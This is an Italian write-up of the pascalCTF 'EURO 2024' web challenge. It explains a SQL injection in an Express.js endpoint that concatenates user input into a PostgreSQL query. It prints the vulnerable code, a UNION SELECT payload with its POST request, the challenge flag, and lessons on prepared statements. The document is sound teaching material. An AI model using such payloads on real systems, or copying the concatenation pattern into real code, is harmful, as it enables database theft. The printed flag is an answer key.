# Writeup: EURO 2024

## Overview
- **Categoria**: Web
- **Autore**: elia (basato su info da pianka)
- **Difficoltà**: (non specificata)
- **URL**: [https://euro2024.challs.pascalctf.it](https://euro2024.challs.pascalctf.it)

## Descrizione 📝
L’applicazione espone un endpoint `/api/group-stats` che esegue una query SQL su un database PostgreSQL, restituendo le statistiche di un gruppo del torneo. Tuttavia, la query è vulnerabile a SQL Injection poiché i parametri vengono concatenati direttamente senza parametri preparati.

Esempio di codice:
```js
// pseudo-codice Express.js
let data = await db.query(`SELECT * FROM GROUP_STATS WHERE group_id = '${group}' ORDER BY ranking ASC`);
res.json({ data: data.rows });
```
La tabella `GROUP_STATS` ha 8 colonne, mentre la tabella `FLAG` ne ha solo 1 (`flag`). Obiettivo: estrarre la flag dalla tabella `FLAG`.

## Soluzione 🎯

### 1. Individuazione della Vulnerabilità
Inserendo il valore di `group` senza filtraggio nella query, si può iniettare codice SQL arbitrario. 

### 2. Uso di UNION
Per combinare i risultati di `GROUP_STATS` (8 colonne) con la colonna `flag` (1 colonna), dobbiamo costruire un finto set di 8 colonne. Esempio di payload:
```
A' UNION SELECT 'X', flag, 0, 0, 0, 0, 0, 0 FROM FLAG --
```
- **`A'`**: chiude la stringa `group_id = 'A'`.
- **`UNION SELECT ... FROM FLAG`**: seleziona la flag nella seconda colonna, riempiendo le altre 7 con valori fittizi compatibili (CHAR/VARCHAR/INT).
- **`--`**: commenta il resto della query (`ORDER BY ranking ASC`).

### 3. Invio della Richiesta
Tramite `POST /api/group-stats`, con JSON:
```json
{
  "group": "A' UNION SELECT 'X', flag, 0, 0, 0, 0, 0, 0 FROM FLAG --"
}
```
Il server esegue la query iniettata e restituisce un array di oggetti JSON. Oltre alle righe reali di `GROUP_STATS` per `group_id = 'A'`, c’è una riga aggiuntiva con `group_id = 'X'` e la `flag` in `team_name`.

### 4. Lettura della Flag
Nella risposta JSON, si troverà qualcosa del tipo:
```json
{
  "data": [
    { "group_id": "A", "team_name": "Germany", ... },
    { "group_id": "A", "team_name": "Switzerland", ... },
    { "group_id": "X", "team_name": "pascalCTF{fl4g_is_in_7h3_eyes_of_the_beh0lder}", ... }
  ]
}
```
La flag è `pascalCTF{fl4g_is_in_7h3_eyes_of_the_beh0lder}`.

## Lezioni Apprese 📚
1. **SQL Injection**: Concatenare parametri direttamente in query SQL è altamente pericoloso.
2. **UNION**: Permette di unire i risultati di due SELECT con lo stesso numero di colonne.
3. **Protezione**: L’uso di parametri preparati o ORM riduce il rischio di injection.

## Tools Utilizzati 🛠️
- **cURL / Postman**: Per inviare la richiesta POST con il payload.
- **Browser Dev Tools**: Per monitorare le richieste e ispezionare le risposte.
- **Database Skills**: Per costruire la query UNION corretta.

---

*Writeup by Luca Crippa - Last Updated: 2024*
